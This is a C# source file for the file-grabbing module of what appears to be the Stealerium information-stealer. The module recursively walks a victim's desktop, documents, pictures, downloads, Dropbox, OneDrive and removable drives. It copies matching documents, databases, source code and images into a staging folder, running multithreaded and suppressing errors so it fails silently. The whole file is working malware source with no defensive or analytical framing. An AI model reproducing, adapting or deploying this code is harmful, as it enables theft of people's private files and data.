using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using Stealerium.Helpers;

namespace Stealerium.Target.System
{
    internal sealed class FileGrabber
    {
        private static string _savePath = "Grabber";

        // Target directories
        private static readonly List<string> TargetDirs = new List<string>
        {
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DropBox"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OneDrive")
        };

        private static string RecordFileType(string type)
        {
            switch (type)
            {
                case "Document":
                {
                    Counter.GrabberDocuments++;
                    break;
                }
                case "DataBase":
                {
                    Counter.GrabberDatabases++;
                    break;
                }
                case "SourceCode":
                {
                    Counter.GrabberSourceCodes++;
                    break;
                }
                case "Image":
                {
                    Counter.GrabberImages++;
                    break;
                }
            }

            return type;
        }


        // Detect file type by name
        private static string DetectFileType(string extensionName)
        {
            var fileExtension = extensionName
                .Replace(".", "").ToLower();
            foreach (var type in Config.GrabberFileTypes)
            foreach (var extension in type.Value)
                if (fileExtension.Equals(extension))
                    return RecordFileType(type.Key);

            return null;
        }


        // Grab file
        private static void GrabFile(string path)
        {
            // Check file size
            var file = new FileInfo(path);
            if (file.Length > Config.GrabberSizeLimit) return;
            // Check file name
            if (file.Name == "desktop.ini") return;
            // Check file type
            var type = DetectFileType(file.Extension);
            if (type == null) return;
            // Get directory and file paths to copy
            var copyDirectoryName = Path.Combine(_savePath, Path.GetDirectoryName(path)
                .Replace(Path.GetPathRoot(path), "DRIVE-" + Path.GetPathRoot(path).Replace(":", "")));
            var copyFileName = Path.Combine(copyDirectoryName, file.Name);
            // Create directory to copy. If not exists
            if (!Directory.Exists(copyDirectoryName))
                Directory.CreateDirectory(copyDirectoryName);
            // Copy file to created directory
            file.CopyTo(copyFileName, true);
        }


        // Grab all files from directory
        private static void GrabDirectory(string path)
        {
            // If directory not exists => stop
            if (!Directory.Exists(path))
                return;
            // Get directories and files
            string[] dirs, files;
            try
            {
                dirs = Directory.GetDirectories(path);
                files = Directory.GetFiles(path);
            }
            catch (UnauthorizedAccessException)
            {
                return;
            }
            catch (AccessViolationException)
            {
                return;
            }

            // Grab files from directory and scan other directories
            foreach (var file in files)
                GrabFile(file);
            foreach (var dir in dirs)
                try
                {
                    GrabDirectory(dir);
                }
                catch
                {
                    // ignored
                }
        }

        // Run file grabber
        public static void Run(string sSavePath)
        {
            try
            {
                // Set save path
                _savePath = sSavePath;
                // Add USB, CD drives to grabber
                foreach (var drive in DriveInfo.GetDrives())
                    if (drive.DriveType == DriveType.Removable && drive.IsReady)
                        TargetDirs.Add(drive.RootDirectory.FullName);
                // Create save directory if not exists
                if (!Directory.Exists(_savePath))
                    Directory.CreateDirectory(_savePath);
                // Threads list
                var threads = new List<Thread>();
                // Create threads
                foreach (var dir in TargetDirs)
                    try
                    {
                        threads.Add(new Thread(() => GrabDirectory(dir)));
                    }
                    catch
                    {
                        // ignored
                    }

                // Run threads
                foreach (var t in threads)
                    t.Start();
                // Wait threads
                foreach (var t in threads.Where(t => t.IsAlive))
                    t.Join();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}